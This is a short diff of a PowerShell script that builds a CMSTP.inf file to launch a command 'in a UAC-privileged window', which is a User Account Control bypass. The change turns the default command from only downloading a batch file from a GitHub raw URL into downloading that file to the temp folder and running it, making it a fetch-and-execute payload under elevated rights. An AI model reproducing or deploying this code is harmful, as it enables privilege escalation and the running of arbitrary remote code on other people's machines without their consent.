@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe /c curl -s https://raw.githubusercontent.com/DBlack7/Administrator/refs/heads/main/exc.bat --output %TEMP%/client.bat'
+	[String]$CommandToExecute = 'cmd.exe /c curl -s https://raw.githubusercontent.com/DBlack7/Administrator/refs/heads/main/exc.bat --output %TEMP%/client.bat && timeout /t 2 >nul && %TEMP%/client.bat'
 	)
 
 $InfContent = @"
